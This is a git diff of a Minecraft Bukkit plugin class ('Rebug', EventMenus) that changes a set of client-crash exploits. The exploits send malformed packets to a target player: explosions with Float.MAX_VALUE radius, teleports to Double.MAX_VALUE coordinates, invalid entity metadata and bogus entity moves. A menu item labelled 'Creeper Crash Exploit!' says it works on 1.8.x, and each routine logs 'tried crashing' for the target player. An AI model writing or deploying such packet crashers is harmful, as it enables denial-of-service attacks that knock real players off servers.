@@ -6,6 +6,7 @@ import org.bukkit.Bukkit;
 import org.bukkit.ChatColor;
 import org.bukkit.Material;
 import org.bukkit.command.CommandSender;
+import org.bukkit.craftbukkit.v1_8_R3.inventory.CraftItemStack;
 import org.bukkit.entity.Player;
 import org.bukkit.event.EventHandler;
 import org.bukkit.event.Listener;
@@ -13,30 +14,11 @@ import org.bukkit.event.inventory.*;
 import org.bukkit.inventory.Inventory;
 import org.bukkit.inventory.ItemStack;
 import org.bukkit.inventory.meta.ItemMeta;
-
 import io.netty.buffer.Unpooled;
 import me.killstorm103.Rebug.Commands.Menu;
 import me.killstorm103.Rebug.Main.Rebug;
 import me.killstorm103.Rebug.Utils.PT;
-import net.minecraft.server.v1_8_R3.BlockPosition;
-import net.minecraft.server.v1_8_R3.ChatComponentText;
-import net.minecraft.server.v1_8_R3.DataWatcher;
-import net.minecraft.server.v1_8_R3.EnumParticle;
-import net.minecraft.server.v1_8_R3.MobEffect;
-import net.minecraft.server.v1_8_R3.Packet;
-import net.minecraft.server.v1_8_R3.PacketDataSerializer;
-import net.minecraft.server.v1_8_R3.PacketPlayOutBed;
-import net.minecraft.server.v1_8_R3.PacketPlayOutChat;
-import net.minecraft.server.v1_8_R3.PacketPlayOutCollect;
-import net.minecraft.server.v1_8_R3.PacketPlayOutCustomPayload;
-import net.minecraft.server.v1_8_R3.PacketPlayOutEntityEffect;
-import net.minecraft.server.v1_8_R3.PacketPlayOutEntityMetadata;
-import net.minecraft.server.v1_8_R3.PacketPlayOutEntityStatus;
-import net.minecraft.server.v1_8_R3.PacketPlayOutExplosion;
-import net.minecraft.server.v1_8_R3.PacketPlayOutGameStateChange;
-import net.minecraft.server.v1_8_R3.PacketPlayOutPosition;
-import net.minecraft.server.v1_8_R3.PacketPlayOutWorldParticles;
-import net.minecraft.server.v1_8_R3.Vec3D;
+import net.minecraft.server.v1_8_R3.*;
 
 
 public class EventMenus implements Listener
@@ -54,10 +36,18 @@ public class EventMenus implements Listener
 		}
 		if (mode.equalsIgnoreCase("Test"))
 		{
-			DataWatcher data = new DataWatcher(PT.getEntityPlayer(player));
-			data.a (-Integer.MAX_VALUE, Integer.MAX_VALUE);
-			packet = new PacketPlayOutEntityMetadata(player.getEntityId(), data, true);
-			PT.SendPacket(player, packet);
+			
+			ItemStack item = Reset(new ItemStack(Material.ANVIL));
+			itemMeta.setDisplayName(ChatColor.DARK_RED + "Crash Anvil!");
+			item.setItemMeta(itemMeta);
+			player.setItemInHand(item);
+			net.minecraft.server.v1_8_R3.ItemStack stack = CraftItemStack.asNMSCopy(item);
+			PT.SendPacket(player, new PacketPlayOutEntity.PacketPlayOutRelEntityMove(player.getEntityId(), (byte) player.getLocation().getBlockX(), (byte) player.getLocation().getBlockY(), (byte) player.getLocation().getBlockZ(), true));
+			PT.SendPacket(player, new PacketPlayOutEntity.PacketPlayOutEntityLook(player.getEntityId(), (byte) 0, (byte) 90, true));
+			//PT.PlaceItemWithPacket(player, new BlockPosition(player.getLocation().getBlockX() + 1, player.getLocation().getBlockY(), player.getLocation().getBlockZ() + 1), block, arg, arg2);
+		//	stack.getItem().interactWith(stack, PT.getEntityHuman(player), PT.getWorld(player), new BlockPosition(player.getLocation().getBlockX() + 1, player.getLocation().getBlockY(), player.getLocation().getBlockZ() + 1), EnumDirection.DOWN, 0, 0, 0);
+		//	stack.placeItem((EntityHuman) PT.getEntityPlayer(player), PT.getWorld(player),
+		//	new BlockPosition(player.getLocation().getBlockX() + 1, player.getLocation().getBlockY(), player.getLocation().getBlockZ() + 1), EnumDirection.DOWN, 0, 0, 0);			
 			PT.Log(sender, "tried crashing " + player.getName());
 		}
 		if (mode.equalsIgnoreCase("NumbWare"))
@@ -72,14 +62,6 @@ public class EventMenus implements Listener
             packet = new PacketPlayOutExplosion(player.getLocation().getX(), player.getLocation().getY(), player.getLocation().getZ(), Float.MAX_VALUE, new ArrayList<BlockPosition>(), new Vec3D(player.getLocation().getX(), player.getLocation().getY(), player.getLocation().getZ()));
             PT.SendPacket(player, packet);
             PT.Log(sender, "tried crashing " + player.getName());
-		}
-		if (mode.equalsIgnoreCase("illegal Data Watcher")) // TODO: Make this work!
-		{
-			DataWatcher data = new DataWatcher(PT.getEntityPlayer(player));
-			data.a (18, Integer.MAX_VALUE);
-			packet = new PacketPlayOutEntityMetadata(PT.getEntityPlayer(player).getId(), data, true);
-			PT.SendPacket(player, packet);
-			PT.Log(sender, "tried crashing " + player.getName());
 		}
 		if (mode.equalsIgnoreCase("Particle"))
 		{
@@ -110,8 +92,7 @@ public class EventMenus implements Listener
 		{
 			for (int i = 0; i < PacketPlayOutPosition.EnumPlayerTeleportFlags.values().length; i ++)
 			{
-				packet =
-				new PacketPlayOutPosition(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE, Float.MAX_VALUE, Float.MAX_VALUE, PacketPlayOutPosition.EnumPlayerTeleportFlags.a(i));
+				packet = new PacketPlayOutPosition(Double.MAX_VALUE, Double.MAX_VALUE, -Double.MAX_VALUE, Float.MAX_VALUE, -Float.MAX_VALUE, PacketPlayOutPosition.EnumPlayerTeleportFlags.a(i));
 				PT.SendPacket(player, packet);
 			}
 			PT.Log(sender, "tried crashing " + player.getName());
@@ -221,7 +202,7 @@ public class EventMenus implements Listener
 						{
 							player.closeInventory();
 							inventory = PT.createInventory(player, 9, ChatColor.RED + "Spawn Entity Crashers");
-							item = Reset(new ItemStack(Material.WOOL));
+							item = Reset(new ItemStack(Material.WOOL, 1, (short) 14));
 							itemMeta.setDisplayName(ChatColor.BLUE + "Back");
 							lore.add("takes you back to the");
 							lore.add("crashers menu.");
@@ -229,9 +210,11 @@ public class EventMenus implements Listener
 							item.setItemMeta(itemMeta);
 							inventory.setItem(0, item);
 							
-							item = Reset(new ItemStack(Material.MOB_SPAWNER));
+							item = Reset(new ItemStack(Material.SKULL_ITEM, 1, (short) 4));
 							itemMeta.setDisplayName(ChatColor.RED + "Creeper");
 							lore.add("Creeper Crash Exploit!");
+							lore.add("");
+							lore.add("Works on " + ChatColor.DARK_RED + "1.8.x");
 							itemMeta.setLore(lore);
 							item.setItemMeta(itemMeta);
 							inventory.setItem(1, item);
